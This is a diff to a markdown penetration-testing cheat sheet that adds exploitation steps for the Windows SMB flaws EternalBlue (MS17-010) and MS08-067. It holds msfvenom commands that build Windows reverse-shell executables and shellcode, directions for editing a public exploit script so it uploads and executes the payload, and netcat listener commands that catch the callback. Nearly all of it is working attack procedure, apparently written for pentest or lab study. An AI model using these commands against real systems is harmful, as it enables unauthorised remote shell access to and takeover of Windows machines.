@@ -87,7 +87,22 @@
 
 ### Eternal Blue (MS17-010) 
 
-<code>
+Use exploit found [here](https://github.com/worawit/MS17-010)
+
+#### Payload
+
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe -o shell.exe</code>
+
+Change the <code>USERNAME = ''</code> line to <code>USERNAME = '//'</code>
+
+
+Uncomment the <code>smb_send_file(...)</code> and the <code>service_exe(...)</code>
+
+Modify them to upload and execute the payload file
+
+Use listener 
+
+<code>nc -lnvp [PORT]</code>
 
 ### MS08-067
 
@@ -95,9 +110,9 @@ Use exploit found [here](https://github.com/andyacer/ms08_067)
 
 #### Payloads
 
-Windows x86: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -o shell.c</code>
+Windows x86: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -o shell.c</code>
 
-Windows x64: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x64 --platform windows -o shell.c</code>
+Windows x64: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x64 --platform windows -o shell.c</code>
 
 Replace shell code in the script 
 
@@ -105,5 +120,8 @@ Execute the script
 
 <code>python ms08_067_2018.py [IP] [OS_OPTION] [PORT]</code>
 
+Use listener 
+
+<code>nc -lnvp [PORT]</code>
 
 
